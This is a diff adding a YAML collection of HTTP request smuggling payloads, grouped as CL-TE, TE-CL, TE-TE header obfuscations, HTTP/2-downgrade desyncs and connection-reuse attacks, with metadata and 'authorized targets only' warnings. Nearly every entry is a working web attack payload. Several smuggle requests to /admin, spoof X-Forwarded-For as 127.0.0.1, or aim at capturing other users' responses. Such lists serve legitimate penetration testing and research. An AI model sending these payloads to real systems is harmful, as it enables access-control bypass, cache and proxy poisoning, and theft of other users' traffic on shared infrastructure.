@@ -1,0 +1,290 @@
+# HTTP Request Smuggling Payloads with Metadata
+# Usage: Filter by type and context for targeted testing
+# WARNING: Only test on authorized targets — smuggling affects shared infrastructure
+
+payloads:
+  # CL-TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 13
+      Transfer-Encoding: chunked
+
+      0
+
+      SMUGGLED
+    type: CL-TE
+    context: [reverse-proxy, load-balancer]
+    detection: response-difference
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 6
+      Transfer-Encoding: chunked
+
+      0
+
+      G
+    type: CL-TE
+    context: [reverse-proxy, load-balancer]
+    detection: method-prefix-leak
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 41
+      Transfer-Encoding: chunked
+
+      0
+
+      GET /admin HTTP/1.1
+      Host: target.com
+
+    type: CL-TE
+    context: [reverse-proxy, load-balancer]
+    detection: unauthorized-access
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 60
+      Transfer-Encoding: chunked
+
+      0
+
+      POST /admin HTTP/1.1
+      Content-Length: 15
+      X-Forwarded-For: 127.0.0.1
+
+    type: CL-TE
+    context: [reverse-proxy, load-balancer]
+    detection: internal-header-injection
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  # TE-CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 3
+      Transfer-Encoding: chunked
+
+      8
+      SMUGGLED
+      0
+
+    type: TE-CL
+    context: [reverse-proxy, load-balancer]
+    detection: response-difference
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 4
+      Transfer-Encoding: chunked
+
+      2e
+      GET /admin HTTP/1.1
+      Host: target.com
+      X: X
+      0
+
+    type: TE-CL
+    context: [reverse-proxy, load-balancer]
+    detection: unauthorized-access
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 4
+      Transfer-Encoding: chunked
+
+      5c
+      POST / HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 15
+
+      x=1
+      0
+
+    type: TE-CL
+    context: [reverse-proxy, load-balancer]
+    detection: request-prefix-injection
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  # TE-TE: Both use Transfer-Encoding but can be desynchronized via obfuscation
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Transfer-Encoding: chunked
+      Transfer-Encoding: identity
+
+      0
+
+      SMUGGLED
+    type: TE-TE
+    context: [reverse-proxy, load-balancer, CDN]
+    bypass_type: duplicate-header
+    detection: response-difference
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Transfer-Encoding: chunked
+      Transfer-encoding: x
+
+      0
+
+      SMUGGLED
+    type: TE-TE
+    context: [reverse-proxy, load-balancer, CDN]
+    bypass_type: case-variation
+    detection: response-difference
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Transfer-Encoding: xchunked
+
+      0
+
+      SMUGGLED
+    type: TE-TE
+    context: [reverse-proxy, CDN]
+    bypass_type: prefix-obfuscation
+    detection: response-difference
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Transfer-Encoding : chunked
+
+      0
+
+      SMUGGLED
+    type: TE-TE
+    context: [reverse-proxy, load-balancer]
+    bypass_type: space-before-colon
+    detection: response-difference
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Transfer-Encoding:chunked
+      Content-Length: 6
+
+      0
+
+      X
+    type: TE-TE
+    context: [reverse-proxy, CDN]
+    bypass_type: no-space-after-colon
+    detection: response-difference
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      X: X[\n]Transfer-Encoding: chunked
+
+      0
+
+      SMUGGLED
+    type: TE-TE
+    context: [reverse-proxy, load-balancer]
+    bypass_type: newline-prefix
+    detection: response-difference
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  # H2-downgrade: HTTP/2 to HTTP/1.1 desync
+  - payload: |
+      :method POST
+      :path /
+      :authority target.com
+      content-length: 0
+      transfer-encoding: chunked
+
+      0
+
+      GET /admin HTTP/1.1
+      Host: target.com
+
+    type: H2-downgrade
+    context: [reverse-proxy, CDN]
+    detection: unauthorized-access
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      :method POST
+      :path /
+      :authority target.com
+      transfer-encoding: chunked
+
+      0
+
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 50
+
+      x=
+    type: H2-downgrade
+    context: [reverse-proxy, CDN]
+    detection: request-prefix-injection
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      :method GET
+      :path / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED
+      :authority target.com
+    type: H2-downgrade
+    context: [reverse-proxy, CDN]
+    bypass_type: header-injection-via-pseudo
+    detection: response-difference
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  # Connection-state smuggling
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 34
+      Connection: keep-alive
+      Transfer-Encoding: chunked
+
+      0
+
+      GET /flag HTTP/1.1
+      Foo: x
+    type: CL-TE
+    context: [reverse-proxy, load-balancer]
+    bypass_type: connection-reuse
+    detection: cross-user-response
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
+
+  - payload: |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 0
+      Transfer-Encoding: chunked
+      Transfer-Encoding: x
+
+      5
+      0
+
+      GET /admin HTTP/1.1
+      X-Ignore: X
+      0
+
+    type: TE-TE
+    context: [reverse-proxy, CDN, load-balancer]
+    bypass_type: combo-obfuscation
+    detection: unauthorized-access
+    warning: "Only test on authorized targets — smuggling affects shared infrastructure"
